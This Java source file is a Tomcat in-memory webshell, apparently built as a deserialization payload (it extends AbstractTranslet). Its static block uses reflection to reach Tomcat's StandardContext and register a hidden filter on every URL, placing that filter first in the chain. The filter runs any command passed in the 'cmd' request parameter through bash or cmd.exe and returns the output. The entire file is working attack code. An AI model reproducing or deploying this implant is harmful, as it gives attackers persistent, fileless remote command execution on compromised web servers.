package com.Jasetol.Torjans;

import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.LifecycleState;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import javax.servlet.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.Map;
import java.util.Scanner;
/*
* Shiro 框架无法注入
* */
public class InjectTomcat02Step02 extends AbstractTranslet implements Filter{
    private static String filterName = "k";
    private static String param = "cmd";
    private static String filterUrlPattern = "/*";
    static {
        try{
            ServletRequest servletRequest = null;
            Class clazz = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            Field field = clazz.getDeclaredField("lastServicedRequest");
            field.setAccessible(true);
            ThreadLocal threadLocal = (ThreadLocal) field.get(null);
            if (threadLocal != null && threadLocal.get() != null){
                servletRequest = (ServletRequest) threadLocal.get();
            }
            ServletContext servletContext = servletRequest.getServletContext();
            if (servletContext != null){
                Field context01 = servletContext.getClass().getDeclaredField("context");
                context01.setAccessible(true);
                ApplicationContext applicationContext = (ApplicationContext) context01.get(servletContext);
                Field context02 = applicationContext.getClass().getDeclaredField("context");
                context02.setAccessible(true);
                StandardContext standardContext = (StandardContext) context02.get(applicationContext);
                Field filterConfigs = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("filterConfigs");
                filterConfigs.setAccessible(true);
                Map map = (Map) filterConfigs.get(standardContext);
                if (map.get(filterName) == null){
                    Field stateField = Class.forName("org.apache.catalina.util.LifecycleBase").getDeclaredField("state");
                    stateField.setAccessible(true);
                    stateField.set(standardContext, LifecycleState.STARTING_PREP);
                    FilterRegistration.Dynamic filter = applicationContext.addFilter(filterName, new InjectTomcat02Step02());
                    filter.addMappingForUrlPatterns(java.util.EnumSet.of(DispatcherType.REQUEST),false,new String[]{filterUrlPattern});
                    Method filterStart = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("filterStart");
                    filterStart.invoke(standardContext,null);
                    FilterMap[] filterMaps = standardContext.findFilterMaps();
                    for (int i = 0 ; i < filterMaps.length ; i++){
                        if (filterMaps[i].getFilterName().equalsIgnoreCase(filterName)){
                            FilterMap filterMap = filterMaps[0];
                            filterMaps[0] = filterMaps[i];
                            filterMaps[i] = filterMap;
                        }
                    }
                    stateField.set(standardContext,LifecycleState.STARTED);
                }
            }
        }catch (Exception e){}
    }


    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM document, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String string = servletRequest.getParameter(param);
        if (string != null){
            String osName = System.getProperty("os.name");
            String[] cmd = osName != null && osName.toLowerCase().contains("win") ? new String[]{"cmd.exe","/c",string} : new String[]{"/bin/bash","-c",string};
            Process exec = Runtime.getRuntime().exec(cmd);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()));
            StringBuffer stringBuffer = new StringBuffer();
            String lineData;
            while ((lineData = bufferedReader.readLine()) != null){
                stringBuffer.append(lineData + '\n');
            }
            servletResponse.getOutputStream().write(stringBuffer.toString().getBytes(StandardCharsets.UTF_8));
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
        }
        filterChain.doFilter(servletRequest,servletResponse);
    }

    @Override
    public void destroy() {

    }
}